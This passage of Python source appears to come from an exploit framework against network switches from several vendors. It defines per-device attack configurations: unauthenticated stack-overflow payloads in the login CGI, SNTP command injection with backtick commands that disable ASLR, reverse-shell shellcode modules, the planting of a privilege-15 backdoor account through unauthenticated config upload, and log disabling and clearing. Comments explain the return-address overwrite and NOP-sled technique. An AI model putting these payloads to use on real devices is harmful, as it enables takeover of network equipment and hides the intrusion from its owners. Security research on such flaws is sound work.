						'log_fileClear_cmd':'&target=1',			# Clean FILE log CMD
						'log_fileClear_SIGSEGV':True,				# Clean FILE log SIGSEGV ?

						'workaround':False,	# My LAB workaround
						'verify_uri':'',
						'vulnerable': True,
						'safe': True
					},
					'stack_cgi_sntp': {
						'description':'Stack overflow in "username/password" (PoC: Disable ASLR)',
						'authenticated': False,
						'uri':'/cgi/set.cgi?cmd=home_loginAuth',
						'content':'{"_ds=1&username='+ self.random_string(348)+ '_JUMP_&password='+ self.random_string(308) +'_CMD_&_de=1":{}}',
						'sys_timeSntp_set_cmd':'&sntp=1&srvDef=ipv4&srvHost=`echo 0 > /proc/sys/kernel/randomize_va_space`&port=139&dlsType=0',
						'sys_timeSntp_set_check':'&sntp=1&srvDef=ipv4&srvHost=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&port=139&dlsType=0',

						'sys_timeSntpDel_set_cmd':'&sntp=1&srvDef=ipv4&srvHost=+&port=139&dlsType=0',				# CMD

						'sys_timeSettings_set_cmd_enable':'&sntp=1',	# Enable CMD
						'sys_timeSettings_set_cmd_disable':'&sntp=0',	# Disable CMD
						'sys_timeSettings_set_SIGSEGV': True,		# SIGSEGV ?

						'workaround':False,	# My LAB workaround
						'verify_uri':'/tmp/check',
						'vulnerable': True,
						'safe': True
					}, 
					#
					# After disabled ASLR, we can proceed to put NOP sled and shellcode on stack.
					# Then we will start walk down from top of stack to hit the NOP sled to execute shellcode
					#
					'heack_cgi_shell': {
						'description':'Stack overflow in "username/password" (PoC: reverse shell)',
						'authenticated': False,
						'login_uri':'/cgi/set.cgi?cmd=home_loginAuth',
						'logout_uri':'/cgi/set.cgi?cmd=home_logout',
						'query':'{"_ds=1&username=_ALIGN_USRNOP_SHELLCODE&password=_PWDNOP_RA_START&_de=1":{}}',
						'stack':True, # False = use Heap, and there are no ASLR
						'workaround':False,	# My LAB workaround
						'vulnerable': True,
						'safe': True
					},

				},
			},

			'Cerio': { 
				'vendor': 'CERIO Corp.',
				'modulus_uri':'/cgi/get.cgi?cmd=home_login',
				'info_leak': False,
				'info_leak_JSON':True,
				'info_leak_uri':'/cgi/get.cgi?cmd=home_login',
				'xsid':False,
				'xsid_uri':'/cgi/get.cgi?cmd=home_main',
				'login': {
					'description':'Login/Logout on remote device',
					'authenticated': True,
					'json':True,
					'encryption':'rsa',
					'login_uri':'/cgi/set.cgi?cmd=home_loginAuth',
					'query':'{"_ds=1&username=USERNAME&password=PASSWORD&_de=1":{}}',
					'status_uri':'/cgi/get.cgi?cmd=home_loginStatus',
					'logout_uri':'/cgi/set.cgi?cmd=home_logout',
					'vulnerable': True,
					'safe': True
				},
				'log':{
						'description':'Disable and clean logs',
						'authenticated': True,
						'json':True,
						'disable_uri':'/cgi/set.cgi?cmd=log_global',
						'disable_query':'{"_ds=1&empty=1&_de=1":{}}',
						'status':'/cgi/get.cgi?cmd=log_global',
						'clean_logfile_uri':'/cgi/set.cgi?cmd=log_clear',
						'clean_logfile_query':'{"_ds=1&target=1&_de=1":{}}',
						'clean_logmem_uri':'/cgi/set.cgi?cmd=log_clear',
						'clean_logmem_query':'{"_ds=1&target=0&_de=1":{}}',
						'vulnerable': True,
						'safe': True
				},
				# Verify lacking authentication
				'verify': { 
						'httpuploadbakcfg.cgi':{
							'authenticated': False,
							'response':'file',
							'Content-Type':True,
							'description':'Upload "backup-config" (PoC: Create invalid file to verify)',
							'uri':'/cgi/httpuploadbakcfg.cgi',
							'check_uri':'/tmp/startup-config',
							'content':'/mntlog/startup-config',			# /mntlog instead of /mnt to verify
							'content_check':'/mntlog/startup-config',	# /mntlog instead of /mnt to verify
							'vulnerable': True,
							'safe': True
						},
						'httpuploadruncfg.cgi':{
							'authenticated': False,
							'response':'file',
							'Content-Type':True,
							'description':'Upload/update "running-config" (PoC: Create invalid file to verify)',
							'uri':'/cgi/httpuploadruncfg.cgi',
							'check_uri':'/tmp/http_saverun_cfg',
							'content':'/var/config/running-config',
							'content_check':'/var/config/running-config',
							'vulnerable': True,
							'safe': True
						},
						'httprestorecfg.cgi':{
							'authenticated': False,
							'response':'file',
							'Content-Type':True,
							'description':'Upload "startup-config" (PoC: Create invalid file to verify)',
							'uri':'/cgi/httprestorecfg.cgi',
							'check_uri':'/tmp/startup-config',
							'content':'/mnt/startup-config',
							'content_check':'/mnt/startup-config',
							'vulnerable': True,
							'safe': True
						},
						'httpupload.cgi':{
							'authenticated': False,
							'response':'file',
							'Content-Type':True,
							'description':'Upload/Upgrade "Firmware" (PoC: Create invalid file to verify)',
							'uri':'/cgi-bin/httpupload.cgi',
							'check_uri':'/tmp/http_uploadfail',
							'content':'Copy: Illegal software format', # Not the real content, its the result of invalid firmware (workaround)
							'content_check':'Copy: Illegal software format',
							'vulnerable': True,
							'safe': True
						},
						'login.cgi': {
							'description':'Stack overflow in login.cgi (PoC: create file /tmp/VUL.TXT)',
							'authenticated': False,
							'response':'file',
							'Content-Type':False,
							'uri':'/cgi/set.cgi?cmd=home_loginAuth',
							'check_uri':'/tmp/VUL.TXT', # We cannot control the content...
							'content':'{"_ds=1&username='+ self.random_string(40) +'&password='+ '/' * 23 +'/tmp/VUL.TXT&_de=1":{}}',
							'content_check':'1',
							'vulnerable': True,
							'safe': True
						},
						'set.cgi': { # 'username' also suffer from stack overflow
							'description':'Stack overflow in "username/password" (PoC: crash CGI)',
							'authenticated': False,
							'response':'502',
							'Content-Type':False,
							'uri':'/cgi/set.cgi?cmd=home_loginAuth',
							'content':'{"_ds=1&username=admin&password=' + self.random_string(312) + '&_de=1":{}}',
							'check_uri':False,
							'content_check':False,
							'vulnerable': True,
							'safe': True
						},
				},
				'exploit': {
					'heack_hydra_shell': {
						'description':'[Boa/Hydra] Stack overflow in Boa/Hydra web server (PoC: reverse shell)',
						'authenticated': False,
						'uri':'/cgi-bin/httpupload.cgi?XXX', # Including alignment of opcodes in memory
						'vulnerable': True,
						'safe': False # Boa/Hydra restart/watchdog, False = no restart, True = restart
					},
					'priv15_account': {
						'description':'Upload/Update running-config (PoC: add priv 15 credentials)',
						'authenticated': False,
						'json':True,
						'encryption':'clear',
						'content':'Content-Type\n\nSYSTEM CONFIG FILE ::= BEGIN\nusername "USERNAME" password PASSWORD\n\n------',
						'add_uri':'/cgi/httpuploadruncfg.cgi',
						'del_query':'{"_ds=1&user=USERNAME&_de=1":{}}',
						'del_uri':'/cgi/set.cgi?cmd=sys_acctDel',
						'vulnerable': True,
						'safe': True
					}, 
					'sntp': {
						'description':'SNTP command injection (PoC: disable ASLR)',
						'json':True,
						'authenticated': True,
						'enable_uri':'/cgi/set.cgi?cmd=sys_time',
						'enable_query':'{"_ds=1&sntp=1&_de=1":{}}',
						'status_uri':'/cgi/get.cgi?cmd=sys_time',
						'inject_uri':'/cgi/set.cgi?cmd=sys_time',

						'inject_query':'{"_ds=1&sntp=1&srvDef=ipv4&srvHost=`echo 0 > /proc/sys/kernel/randomize_va_space`&port=139&_de=1":{}}',
						'check_query':'{"_ds=1&sntp=1&srvDef=ipv4&srvHost=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&port=139&_de=1":{}}',

						'delete_uri':'/cgi/set.cgi?cmd=sys_time',
						'delete_query':'{"_ds=1&sntp=1&timezone=0&srvDef=ipv4&srvHost=+&port=139&dlsType=0&_de=1":{}}',
						'disable_uri':'/cgi/set.cgi?cmd=sys_time',
						'disable_query':'{"_ds=1&sntp=0&_de=1":{}}',
						'verify_uri':'/tmp/check',
						'vulnerable': True,
						'safe': True
					},
					#
					# The stack overflow in 'username' and 'password' at same request are multipurpose.
					#

					#
					# The trick to jump and execute:
					# 1. Code: username=[garbage][RA + 0x58000000]&password=[garbage][NULL termination]
					# 2. [NULL termination] will overwrite 0x58 in RA so we can jump within the binary
					# 3. We dont jump to beginning of the functions, we jump just after 'sw $ra,($sp)' (important)
					# 4. We will also feed required function parameters, by adding them to '_CMD_'
					#
					'stack_cgi_diag': {
						'description':'Stack overflow in "username/password" (PoC: Disable ASLR)',
						'authenticated': False,

						'uri':'/cgi/set.cgi?cmd=home_loginAuth',
						'content':'{"_ds=1&username='+ self.random_string(348)+ '_JUMP_&password='+ self.random_string(308) +'_CMD_&_de=1":{}}',

						'sys_ping_post_SIGSEGV': True,		# SIGSEGV ?

						'workaround':False,	# My LAB workaround
						'vulnerable': True,
						'safe': True

					},
					'stack_cgi_log': {
						'description':'Stack overflow in "username/password" (PoC: Disable/Clean logs)',
						'authenticated': False,
						'uri':'/cgi/set.cgi?cmd=home_loginAuth',
						'content':'{"_ds=1&username='+ self.random_string(348)+ '_JUMP_&password='+ self.random_string(308) +'_CMD_&_de=1":{}}',

						#'log_settings_set_cmd':'&logState=1&consoleState=1&ramState=1&fileState=1',	# Enable Logging CMD
						'log_settings_set_cmd':'&empty=1',			# Disable Logging CMD
						'log_settings_set_SIGSEGV':True,			# Disable Logging SIGSEGV ?

						'log_ramClear_cmd':'&target=0',				# Clean RAM CMD
						'log_ramClear_SIGSEGV':True,				# Clean RAM SIGSEGV ?

						'log_fileClear_cmd':'&target=1',			# Clean FILE log CMD
						'log_fileClear_SIGSEGV':True,				# Clean FILE log SIGSEGV ?

						'workaround':False,	# My LAB workaround
						'verify_uri':'',
						'vulnerable': True,
						'safe': True
					},
					'stack_cgi_sntp': {
						'description':'Stack overflow in "username/password" (PoC: Disable ASLR)',
						'authenticated': False,
						'uri':'/cgi/set.cgi?cmd=home_loginAuth',
						'content':'{"_ds=1&username='+ self.random_string(348)+ '_JUMP_&password='+ self.random_string(308) +'_CMD_&_de=1":{}}',

						'sys_timeSntp_set_cmd':'&sntp=1&srvDef=ipv4&srvHost=`echo 0 > /proc/sys/kernel/randomize_va_space`&port=139&dlsType=0',
						'sys_timeSntp_set_check':'&sntp=1&srvDef=ipv4&srvHost=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&port=139&dlsType=0',

						'sys_timeSntpDel_set_cmd':'&sntp=1&srvDef=ipv4&srvHost=+&port=139&dlsType=0',				# CMD

						'sys_timeSettings_set_cmd_enable':'&sntp=1',	# Enable CMD
						'sys_timeSettings_set_cmd_disable':'&sntp=0',	# Disable CMD
						'sys_timeSettings_set_SIGSEGV': True,		# SIGSEGV ?

						'workaround':False,	# My LAB workaround
						'verify_uri':'/tmp/check',
						'vulnerable': True,
						'safe': True
					}, 
					#
					# After disabled ASLR, we can proceed to put NOP sled and shellcode on stack.
					# Then we will start walk down from top of stack to hit the NOP sled to execute shellcode
					#
					'heack_cgi_shell': {
						'description':'Stack overflow in "username/password" (PoC: reverse shell)',
						'authenticated': False,
						'login_uri':'/cgi/set.cgi?cmd=home_loginAuth',
						'logout_uri':'/cgi/set.cgi?cmd=home_logout',
						'query':'{"_ds=1&username=_ALIGN_USRNOP_SHELLCODE&password=_PWDNOP_RA_START&_de=1":{}}',
						'stack':True, # False = use Heap, and there are no ASLR
						'workaround':False,	# My LAB workaround
						'vulnerable': True,
						'safe': True
					},

				},
			},

			'Abaniact': {
				'vendor': 'Abaniact',
				'modulus_uri':'',
				'info_leak':False,
				'info_leak_JSON':False,
				'info_leak_uri':'',
				'xsid':False,
				'xsid_uri':'',
				'login': {
					'description':'Login/Logout on remote device',
					'authenticated': True,
					'json':False,
					'encryption':'clear',
					'login_uri':'/cgi-bin/dispatcher.cgi?cmd=1',
					'query':'username=USERNAME&password=PASSWORD&login=1',
					'status_uri':'/cgi-bin/dispatcher.cgi?cmd=547',
					'logout_uri':'/cgi-bin/dispatcher.cgi?cmd=3',
					'vulnerable': True,
					'safe': True
				},
				'log':{
						'description':'Disable and clean logs',
						'authenticated': True,
						'json':False,
						'disable_uri':'/cgi-bin/dispatcher.cgi',
						'disable_query':'LOGGING_SERVICE=0&cmd=5121',
						'status':'',
						'clean_logfile_uri':'/cgi-bin/dispatcher.cgi',
						'clean_logfile_query':'cmd_5132=Clear+file+messages',
						'clean_logmem_uri':'/cgi-bin/dispatcher.cgi',
						'clean_logmem_query':'cmd_5132=Clear+buffered+messages',
						'vulnerable': True,
						'safe': True
				},
				# Verify lacking authentication
				'verify': {
						'httpuploadbakcfg.cgi':{
							'authenticated': False,
							'response':'html',
							'Content-Type':True,
							'description':'Upload "backup-config" (PoC: Create invalid file to verify)',
							'uri':'/cgi-bin/httpuploadbakcfg.cgi',
							'check_uri':'',
							'content':'dummy',
							'content_check':' Invalid config file!!', # one 0x20 in beginning
							'vulnerable': True,
							'safe': True
						},
						'httpuploadruncfg.cgi':{
							'authenticated': False,
							'response':'html',
							'Content-Type':True,
							'description':'Upload/update "running-config" (PoC: Create invalid file to verify)',
							'uri':'/cgi-bin/httpuploadruncfg.cgi',
							'check_uri':'',
							'content':'dummy',
							'content_check':' Invalid config file!!', # one 0x20 in beginning
							'vulnerable': True,
							'safe': True
						},
						'httprestorecfg.cgi':{
							'authenticated': False,
							'response':'html',
							'Content-Type':True,
							'description':'Upload "startup-config" (PoC: Create invalid file to verify)',
							'uri':'/cgi-bin/httprestorecfg.cgi',
							'check_uri':'',
							'content':'dummy',
							'content_check':' Invalid config file!!', # one 0x20 in beginning
							'vulnerable': True,
							'safe': True
						},
						'httpupload.cgi':{
							'authenticated': False,
							'response':'html',
							'Content-Type':True,
							'description':'Upload/Upgrade "Firmware" (PoC: Create invalid file to verify)',
							'uri':'/cgi-bin/httpupload.cgi',
							'check_uri':'',
							'content':'dummy',
							'content_check':'Image Signature Error',
							'vulnerable': True,
							'safe': True
						},
						'dispatcher.cgi': { # 'username' also suffer from stack overflow
							'description':'Stack overflow in "username/password" (PoC: crash CGI)',
							'response':'502',
							'Content-Type':False,
							'authenticated': False,
							'uri':'/cgi-bin/dispatcher.cgi?cmd=1',
							'content':'username=admin&password='+ self.random_string(184) + '&login=1',
							'check_uri':False,
							'content_check':False,
							'vulnerable': True,
							'safe': True
						},
				},
				'exploit': {
					'heack_hydra_shell': {
						'description':'[Boa/Hydra] Stack overflow in Boa/Hydra web server (PoC: reverse shell)',
						'authenticated': False,
						'uri':'/cgi-bin/httpupload.cgi?XXX', # Including alignment of opcodes in memory
						'vulnerable': True,
						'safe': False # Boa/Hydra restart/watchdog, False = no restart, True = restart
					},
					'priv15_account': {
						'description':'Upload/Update running-config (PoC: add priv 15 credentials)',
						'json':False,
						'authenticated': False,
						'encryption':'md5',
						'content':'Content-Type\n\nSYSTEM CONFIG FILE ::= BEGIN\nusername "USERNAME" secret encrypted PASSWORD\n\n------',
						'add_uri':'/cgi-bin/httpuploadruncfg.cgi',
						'del_query':'', 
						'del_uri':'/cgi-bin/dispatcher.cgi?cmd=526&usrName=USERNAME',
						'vulnerable': True,
						'safe': True
					}, 
					'sntp': {
						'description':'SNTP command injection (PoC: disable ASLR)',
						'json':False,
						'authenticated': True,
						'enable_uri':'/cgi-bin/dispatcher.cgi',
						'enable_query':'sntp_enable=1&cmd=548',
						'status_uri':'/cgi/get.cgi?cmd=sys_timeSettings',
						'inject_uri':'/cgi-bin/dispatcher.cgi',
						'inject_query':'sntp_Server=`echo 0 > /proc/sys/kernel/randomize_va_space`&sntp_Port=123&cmd=550',
						'check_query':'sntp_Server=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&sntp_Port=123&cmd=550',
						'delete_uri':'/cgi-bin/dispatcher.cgi',
						'delete_query':'sntp_Server=+&sntp_Port=123&cmd=550',
						'disable_uri':'/cgi-bin/dispatcher.cgi',
						'disable_query':'sntp_enable=0&cmd=548',
						'verify_uri':'/tmp/check',
						'vulnerable': True,
						'safe': True
					},
					#
					# The stack overflow in 'username' and 'password' at same request are multipurpose.
					#

					#
					# The trick to jump and execute:
					# 1. Code: username=[garbage][RA + 0x58000000]&password=[garbage][NULL termination]
					# 2. [NULL termination] will overwrite 0x58 in RA so we can jump within the binary
					# 3. We dont jump to beginning of the functions, we jump just after 'sw $ra,($sp)' (important)
					# 4. We will also feed required function parameters, by adding them to '_CMD_'
					#
					'stack_cgi_diag': {
						'description':'Stack overflow in "username/password" (PoC: Disable ASLR)',
						'authenticated': False,

						'uri':'/cgi-bin/dispatcher.cgi?cmd=1',
						'content':'username='+ self.random_string(212) +'_JUMP_&password='+ self.random_string(180) +'&login=1&_CMD_',
						'sys_ping_post_check':'',
						'sys_ping_post_SIGSEGV': False,		# SIGSEGV ?

						'workaround':True,	# My LAB workaround

						'vulnerable': True,
						'safe': True

					},
					'stack_cgi_log': {
						'description':'Stack overflow in "username/password" (PoC: Disable/Clean logs)',
						'authenticated': False,
						'uri':'/cgi-bin/dispatcher.cgi?cmd=1',
						'content':'username='+ self.random_string(212) +'_JUMP_&password='+ self.random_string(180) +'_CMD_&login=1',

						'log_settings_set_cmd':'&LOGGING_SERVICE=0',# Disable Logging CMD
						'log_settings_set_SIGSEGV':False,			# Disable Logging SIGSEGV ?

						'log_ramClear_cmd':'',						# Clean RAM log CMD
						'log_ramClear_SIGSEGV':False,				# Clean RAM log SIGSEGV ?

						'log_fileClear_cmd':'',						# Clean FILE log CMD
						'log_fileClear_SIGSEGV':False,				# Clean FILE log SIGSEGV ?

						'workaround':True,	# My LAB workaround
						'verify_uri':'/tmp/check',
						'vulnerable': True,
						'safe': True
					},
					'stack_cgi_sntp': {
						'description':'Stack overflow in "username/password" (PoC: Disable ASLR)',
						'authenticated': False,
						'uri':'/cgi-bin/dispatcher.cgi?cmd=1',
						'content':'username='+ self.random_string(212) +'_JUMP_&password='+ self.random_string(180) +'_CMD_&login=1',

						'sys_timeSntp_set_cmd':'&sntp_Server=`echo 0 > /proc/sys/kernel/randomize_va_space`&sntp_Port=123',
						'sys_timeSntp_set_check':'&sntp_Server=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&sntp_Port=139',

						'sys_timeSntpDel_set_cmd':'&sntp_Server=+&sntp_Port=139',

						'sys_timeSettings_set_cmd_enable':'&sntp_enable=1',
						'sys_timeSettings_set_cmd_disable':'&sntp_enable=0',
						'sys_timeSettings_set_SIGSEGV': False,		# SIGSEGV ?

						'workaround': True,	# My LAB workaround
						'verify_uri':'/tmp/check',
						'vulnerable': False,
						'safe': True
					}, 

					#
					# After disabled ASLR, we can proceed to put NOP sled and shellcode on stack.
					# Then we will start walk down from top of stack to hit the NOP sled to execute shellcode
					#
					'heack_cgi_shell': {
						'description':'Stack overflow in "username/password" (PoC: reverse shell)',
						'authenticated': False,
						'login_uri':'/cgi-bin/dispatcher.cgi?cmd=1',
						'logout_uri':'/cgi-bin/dispatcher.cgi?cmd=3',
						'query':'username=_ALIGN_USRNOP&password=_PWDNOP_RA_START&login=1&shellcode=_USRNOP_USRNOP_USRNOP_SHELLCODE',
						'workaround':True,	# My LAB workaround
						'stack':True, # False = use Heap, and there are no ASLR
						'vulnerable': True,
						'safe': True

					},

				},
			},

			'TG-NET': {
				'vendor': 'Shenzhen TG-NET Botone Technology Co,. Ltd.',
				'uri':'http://www.tg-net.net/productshow.asp?ProdNum=1049&parentid=98',
				'modulus_uri':'',
				'info_leak':False,
				'info_leak_JSON':False,
				'info_leak_uri':'',
				'xsid':False,
				'xsid_uri':'',
				'login': {
					'description':'Login/Logout on remote device',
					'authenticated': True,
					'json':False,
					'encryption':'clear',
					'login_uri':'/cgi-bin/dispatcher.cgi?cmd=1',
					'query':'username=USERNAME&password=PASSWORD&login=1',
					'status_uri':'/cgi-bin/dispatcher.cgi?cmd=547',
					'logout_uri':'/cgi-bin/dispatcher.cgi?cmd=3',
					'vulnerable': True,
					'safe': True
				},
				'log':{
						'description':'Disable and clean logs',
						'authenticated': True,
						'json':False,
						'disable_uri':'/cgi-bin/dispatcher.cgi',
						'disable_query':'LOGGING_SERVICE=0&cmd=4353',
						'status':'/cgi-bin/dispatcher.cgi?cmd=4352',
						'clean_logfile_uri':'/cgi-bin/dispatcher.cgi',
						'clean_logfile_query':'cmd_4364=Clear+file+messages',
						'clean_logmem_uri':'/cgi-bin/dispatcher.cgi',
						'clean_logmem_query':'cmd_4364=Clear+buffered+messages',
						'vulnerable': True,
						'safe': True
				},
				# Verify lacking authentication
				'verify': {
						'httpuploadbakcfg.cgi':{
							'authenticated': False,
							'response':'html',
							'Content-Type':True,
							'description':'Upload "backup-config" (PoC: Create invalid file to verify)',
							'uri':'/cgi-bin/httpuploadbakcfg.cgi',
							'check_uri':'',
							'content':'dummy',
							'content_check':' Invalid config file!!', # one 0x20 in beginning
							'vulnerable': True,
							'safe': True
						},
						'httpuploadruncfg.cgi':{
							'authenticated': False,
							'response':'html',
							'Content-Type':True,
							'description':'Upload/update "running-config" (PoC: Create invalid file to verify)',
							'uri':'/cgi-bin/httpuploadruncfg.cgi',
							'check_uri':'',
							'content':'dummy',
							'content_check':' Invalid config file!!', # one 0x20 in beginning
							'vulnerable': True,
							'safe': True
						},
						'httprestorecfg.cgi':{
							'authenticated': False,
							'response':'html',
							'Content-Type':True,
							'description':'Upload "startup-config" (PoC: Create invalid file to verify)',
							'uri':'/cgi-bin/httprestorecfg.cgi',
							'check_uri':'',
							'content':'dummy',
							'content_check':' Invalid config file!!', # one 0x20 in beginning
							'vulnerable': True,
							'safe': True
						},
						'httpupload.cgi':{
							'authenticated': False,
							'response':'html',
							'Content-Type':True,
							'description':'Upload/Upgrade "Firmware" (PoC: Create invalid file to verify)',
							'uri':'/cgi-bin/httpupload.cgi',
							'check_uri':'',
							'content':'dummy',
							'content_check':'Image Signature Error',
							'vulnerable': True,
							'safe': True
						},
						'dispatcher.cgi': { # 'username' also suffer from stack overflow
							'description':'Stack overflow in "username/password" (PoC: crash CGI)',
							'response':'502',
							'Content-Type':False,
							'authenticated': False,
							'uri':'/cgi-bin/dispatcher.cgi?cmd=1',
							'content':'username=admin&password='+ self.random_string(184) + '&login=1',
							'check_uri':False,
							'content_check':False,
							'vulnerable': True,
							'safe': True
						},
						'httpuploadfirmware.cgi':{
							'authenticated': False,
							'response':'html',
							'Content-Type':True,
							'description':'Upload/Upgrade "Firmware" (PoC: Create invalid file to verify)',
							'uri':'/cgi-bin/httpuploadfirmware.cgi',
							'check_uri':'',
							'content':'dummy',
							'content_check':'Image Signature Error',
							'vulnerable': True,
							'safe': True
						},
						'httpupload_runstart_cfg.cgi':{
							'authenticated': False,
							'response':'file',
							'Content-Type':True,
							'description':'Upload/update "running-config" (PoC: Create invalid file to verify)',
							'uri':'/cgi-bin/httpupload_runstart_cfg.cgi',
							'check_uri':'/tmp/startup-config',
							'content':'/tmp/startup-config',
							'content_check':'/tmp/startup-config',
							'vulnerable': True,
							'safe': True
						},
						'version_upgrade.cgi':{
							'authenticated': False,
							'response':'html',
							'Content-Type':True,
							'description':'Upload/Upgrade "Firmware" (Frontend to "httpuploadfirmware.cgi")',
							'uri':'/cgi-bin/version_upgrade.cgi',
							'check_uri':'',
							'content':'Firm Upgrade',
							'content_check':'Firm Upgrade',
							'vulnerable': True,
							'safe': True
						},
						'factory_reset.cgi':{
							'authenticated': False,
							'response':'html',
							'Content-Type':True,
							'description':'Reset device to factory default (PoC: Too dangerous to verify)',
							'uri':'/cgi-bin/factory_reset.cgi',
							'check_uri':'',
							'content':'Too dangerous to verify',
							'content_check':'dummy',
							'vulnerable': True,
							'safe': False
						},
						'sysinfo_config.cgi':{
							'authenticated': False,
							'response':'html',
							'Content-Type':False,
							'description':'System basic information configuration (Frontend to "change_mac_addr_set.cgi")',
							'uri':'/cgi-bin/sysinfo_config.cgi',
							'check_uri':'',
							'content':'dummy',
							'content_check':'"/cgi-bin/change_mac_addr_set',
							'vulnerable': True,
							'safe': True
						},
						'change_mac_addr_set.cgi': {
							'description':'Stack overflow in "switch_type/sys_hardver" (PoC: crash CGI)',
							'response':'502',
							'Content-Type':False,
							'authenticated': False,
							'uri':'/cgi-bin/change_mac_addr_set.cgi',
							'content':'switch_type='+ self.random_string(116) +'&sys_hardver=31337&sys_macaddr=DE:AD:BE:EF:13:37&sys_serialnumber=DE:AD:BE:EF:13:37&password=tgnetadmin',
							'check_uri':False,
							'content_check':False,
							'vulnerable': True,
							'safe': True
						},

				},
				'exploit': {
					'heack_hydra_shell': {
						'description':'[Boa/Hydra] Stack overflow in Boa/Hydra web server (PoC: reverse shell)',
						'authenticated': False,
						'uri':'/cgi-bin/httpupload.cgi?XXX', # Including alignment of opcodes in memory
						'vulnerable': True,
						'safe': False # Boa/Hydra restart/watchdog, False = no restart, True = restart
					},
					'priv15_account': {
						'description':'Upload/Update running-config (PoC: add priv 15 credentials)',
						'json':False,
						'authenticated': False,
						'encryption':'clear',
						'content':'Content-Type\n\nSYSTEM CONFIG FILE ::= BEGIN\nusername "USERNAME" password PASSWORD\n\n------',
						'add_uri':'/cgi-bin/httpuploadruncfg.cgi',
						'del_query':'', 
						'del_uri':'/cgi-bin/dispatcher.cgi?cmd=524&usrName=USERNAME',
						'vulnerable': True,
						'safe': True
					}, 
					'sntp': {
						'description':'SNTP command injection (PoC: disable ASLR)',
						'json':False,
						'authenticated': True,
						'enable_uri':'/cgi-bin/dispatcher.cgi',
						'enable_query':'sntp_enable=1&cmd=548',
						'status_uri':'cmd=547',
						'inject_uri':'/cgi-bin/dispatcher.cgi',

						'inject_query':'sntp_Server=`echo 0 > /proc/sys/kernel/randomize_va_space`&sntp_Port=123&cmd=550',
						'check_query':'sntp_Server=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&sntp_Port=123&cmd=550',

						'delete_uri':'/cgi-bin/dispatcher.cgi',
						'delete_query':'sntp_Server=+&sntp_Port=123&cmd=550',
						'disable_uri':'/cgi-bin/dispatcher.cgi',
						'disable_query':'sntp_enable=0&cmd=548',
						'verify_uri':'/tmp/check',
						'vulnerable': True,
						'safe': True
					},

					#
					# The stack overflow in 'username' and 'password' at same request are multipurpose.
					#

					#
					# The trick to jump and execute:
					# 1. Code: username=[garbage][RA + 0x58000000]&password=[garbage][NULL termination]
					# 2. [NULL termination] will overwrite 0x58 in RA so we can jump within the binary
					# 3. We dont jump to beginning of the functions, we jump just after 'sw $ra,($sp)' (important)
					# 4. We will also feed required function parameters, by adding them to '_CMD_'
					#
					'stack_cgi_diag': {
						'vulnerable': False,
					},
					'stack_cgi_log': {
						'description':'Stack overflow in "username/password" (PoC: Disable/Clean logs)',
						'authenticated': False,
						'uri':'/cgi-bin/dispatcher.cgi?cmd=1',
						'content':'username='+ self.random_string(112) +'_JUMP_&password='+ self.random_string(80) +'_CMD_&login=1',

						'log_settings_set_cmd':'&LOGGING_SERVICE=0',			# Disable Logging CMD
						'log_settings_set_SIGSEGV':True,						# Disable Logging SIGSEGV ?

						'log_ramClear_cmd':'',									# Clean RAM log CMD
						'log_ramClear_SIGSEGV':False,							# Clean RAM log SIGSEGV ?

						'log_fileClear_cmd':'',									# Clean FILE log CMD
						'log_fileClear_SIGSEGV':False,							# Clean FILE log SIGSEGV ?

						'workaround':False,	# My LAB workaround
						'verify_uri':'/tmp/check',
						'vulnerable': True,
						'safe': True
					},
					'stack_cgi_sntp': {
						'description':'Stack overflow in "username/password" (PoC: Disable ASLR)',
						'authenticated': False,
						'uri':'/cgi-bin/dispatcher.cgi?cmd=1',
						'content':'username='+ self.random_string(112) +'_JUMP_&password='+ self.random_string(80) +'_CMD_&login=1',
						'sys_timeSntp_set_cmd':'&sntp_Server=`echo 0 > /proc/sys/kernel/randomize_va_space`&sntp_Port=123',
						'sys_timeSntp_set_check':'&sntp_Server=`cat /proc/sys/kernel/randomize_va_space > /tmp/check`&sntp_Port=123',
						'sys_timeSntpDel_set_cmd':'&sntp_Server=+&sntp_Port=123',
						'sys_timeSettings_set_cmd_enable':'&sntp_enable=1',
						'sys_timeSettings_set_cmd_disable':'&sntp_enable=0',
						'sys_timeSettings_set_SIGSEGV': False,		# SIGSEGV ?
						'workaround':True,	# My LAB workaround
						'verify_uri':'/tmp/check',
						'vulnerable': True,
						'safe': True
					}, 

					#
					# After disabled ASLR, we can proceed to put NOP sled and shellcode on stack.
					# Then we will start walk down from top of stack to hit the NOP sled to execute shellcode
					#
					'heack_cgi_shell': {
						'description':'Stack overflow in "username/password" (PoC: reverse shell)',
						'authenticated': False,
						'login_uri':'/cgi-bin/dispatcher.cgi?cmd=1',
						'logout_uri':'/cgi-bin/dispatcher.cgi?cmd=3',
						'query':'username=_ALIGN_USRNOP_SHELLCODE&password=_PWDNOP_RA_START&login=1',
						'workaround':False,	# My LAB workaround
						#'stack':False, # False = use Heap, and there are no ASLR
						'stack':True, # False = use Heap, and there are no ASLR
						'vulnerable': True,
						'safe': True
					},

				},
			},


		}

		if self.ETag == 'report':

			sorted_dict = OrderedDict(sorted(Vendor_ETag.items(), key=lambda t: t[1])) # sorted by ETag value
			for targets in sorted_dict:
				self.target = copy.deepcopy(Vendor_Template[Vendor_ETag[targets]['template']])
				self.source = Vendor_ETag[targets]
				self.dict_merge(self.target,self.source)
				print("")

				tmp = "] {} {} v{} [".format(self.target['vendor'],self.target['model'],self.target['version'])
				print("[{:=^78}]".format(tmp))

				print(self.target['uri'])

				print("") # make it nicer to read

				LEN = len(self.target['exploit'])
				for exploits in self.target['exploit']:
					if not self.target['exploit'][exploits]['vulnerable']:
						LEN = LEN - 1

				tmp = "] {}({}) [".format("Exploits ",LEN)
				print("[{:-^78}]".format(tmp))

				for exploits in self.target['exploit']:
					tmp = self.target['exploit'][exploits]
					if self.target['exploit'][exploits]['vulnerable']:
						log.success("{:.<54}[Authenticated: {}]\n{}\n".format(exploits, tmp['authenticated'] ,tmp['description']))

				print("") # make it nicer to read

				tmp = "] {}({}) [".format("Verification ",len(self.target['verify']))
				print("[{:-^78}]".format(tmp))

				for verification in self.target['verify']:
					tmp = self.target['verify'][verification]
					log.success("{:.<54}[Authenticated: {}]\n{}\n".format(verification, tmp['authenticated'] ,tmp['description']))


				print("")
			return False
		elif self.ETag == 'help':
